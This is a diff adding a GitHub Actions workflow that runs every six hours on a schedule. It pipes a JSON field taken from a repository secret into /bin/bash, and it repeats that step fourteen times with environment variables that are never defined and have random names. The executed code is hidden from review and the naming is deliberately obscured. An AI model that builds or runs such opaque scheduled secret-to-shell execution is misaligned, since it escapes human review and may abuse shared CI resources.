@@ -1,0 +1,32 @@
+name: chunyuezhongpin
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chunyuezhongpin
+        env:
+          pui821: ${{ secrets.pui821 }}
+        run: |
+          echo $pui821 | jq -r .cqv91922 | /bin/bash
+          echo $fe24 | jq -r .co16 | /bin/bash
+          echo $z8716 | jq -r .sgeml44 | /bin/bash
+          echo $s0639 | jq -r .ehu741 | /bin/bash
+          echo $urx789 | jq -r .g6441 | /bin/bash
+          echo $yo201 | jq -r .bh1 | /bin/bash
+          echo $kv01 | jq -r .ftkc9835 | /bin/bash
+          echo $vk2 | jq -r .ox8479 | /bin/bash
+          echo $l04 | jq -r .zdo689 | /bin/bash
+          echo $r57 | jq -r .izb8930 | /bin/bash
+          echo $wghpb9441 | jq -r .uxvw2 | /bin/bash
+          echo $ydoik30 | jq -r .oczg54952 | /bin/bash
+          echo $sao560 | jq -r .j04355 | /bin/bash
+          echo $qjmi02 | jq -r .pz165 | /bin/bash
+          echo $rhd4 | jq -r .aw80377 | /bin/bash
+
